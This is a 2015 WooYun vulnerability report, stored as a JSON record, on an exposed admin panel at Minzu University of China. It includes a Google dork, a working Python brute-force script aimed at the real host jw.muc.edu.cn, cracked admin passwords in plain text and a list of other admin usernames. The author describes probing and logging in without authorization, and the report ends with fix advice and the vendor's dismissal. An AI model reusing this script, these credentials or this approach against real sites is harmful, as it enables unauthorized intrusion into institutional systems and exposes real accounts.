{"id": 33975, "wybug_id": "wooyun-2015-0107566", "wybug_title": "中央民族大学某站后台管理权限对外开放", "wybug_corp": "中央民族大学", "wybug_author": "大毛", "wybug_date": "2015-04-14 17:32", "wybug_open_date": "2015-04-20 14:22", "wybug_type": "账户体系控制不严", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["弱口令", "管理后台对外", "口令猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 今日，给LP演示搞安全人的作用，就拿她的母校试了一下，没想到随便一搞就发现了很多问题。1、网站管理后台对外开放2、后台登录无验证码限制且尝试次数不限，适合爆破3、多个管理员存在弱口令，均可极速破解4、登陆后拥有整个教务处网站的管理权限，可发公告、网站信息、可删除信息，可获得所有管理员名称，可以进一步爆破 详细说明：  1、谷歌 搜索：site:muc.edu.cn intitle:后台登录 发现教务处信息管理系统--后台登录\n\n2、发现登录无验证码等限制，用fiddler抓管理员登录数据包，分析\n\n3、对比2个登录数据包请求除了包的大小和用户名口令，其他都一样，且登录失败时，时响应包大小一样4、写脚本，猜用户名密码，一会就猜出来as：123456\n#!/usr/bin/env python#conding=utf-8#author:daMaoimport httplibconn = Nonenamelist = open('jwc.txt','r').readlines()passlist = open('1pass00.txt','r')for i in range(len(namelist)):    namelist[i] = namelist[i].strip('\\n')#for j in range(len(passlist)):#    passlist[j] = passlist[j].strip('\\n')resfile = open('resjwc.txt','a')head = {'Host':' jw.muc.edu.cn',\\'User-Agent':' Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0',\\'Accept':' text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\\'Accept-Language':' zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',\\'Accept-Encoding':' gzip, deflate',\\'Cookie':' ASPSESSIONIDQCTCSTQD=MOFLLCBBLMFMJJAELNCKECEG',\\'Connection':' keep-alive',\\'Content-Type':' application/x-www-form-urlencoded',\\'Content-Length': None}conn = httplib.HTTPConnection('jw.muc.edu.cn',80)for pas in passlist:    pas = pas.strip()    for name in namelist:        data = 'jwc_admin_name=' + name + '&jwc_admin_pwd=' + pas +'&denglu=%B5%C7%C2%BD'        print data        leng = str(len(data))        head['Content-Length'] = leng        conn.request('POST','/jwc/admin/jwc_FindAccount.asp',data,head)        response = conn.getresponse()        reslen = response.getheader('content-length')        read = response.read()        print reslen        if reslen != \"768\":            res = name + ':' + pas + '\\n'            print res            resfile.write(res)            resfile.flush()            namelist.remove(name)            print namelist            break   resfile.close()passlist.close()if conn:    conn.close()\n5、登录后台，有管理员权限，新建公告和信息等，并删除新建内容。注意：因为是ASP的后台，很老，只能用IE6登录才可以添加，其他的浏览器都不支持！！！！6、发现其他管理员发布信息的用户名，用收集到的管理原用户名再次猜解，一会有得到2个管理员帐号。vand:1234jwclaq:123456   漏洞证明：  1、新建公告\n\n2、页面访问可看到\n\n3、新建信息\n\n4、前台访问页面可看到\n\n5、可全选，删除所有的信息（我没删）\n\n6、获得的管理员用户名列表，猜解了前3个，其余就不跑了。as：123456jwclaq：123456vand：1234jwcyjmjwcpyhjwcmyjzymmszhmsongkszxlinkadminsjjx   修复方案：  1、后台管理页面不对外开放，可限制访问源2、后台登录加验证码等防护机制，或限制管理员口令猜解次数3、加强密码复杂度，也太简单了   版权声明：转载请注明来源 大毛@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-20 14:22 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-30 19:42 |    \t\t涛涛不蹶 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 涛涛不蹶)\t\t \n  我看成了中南民族大学    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}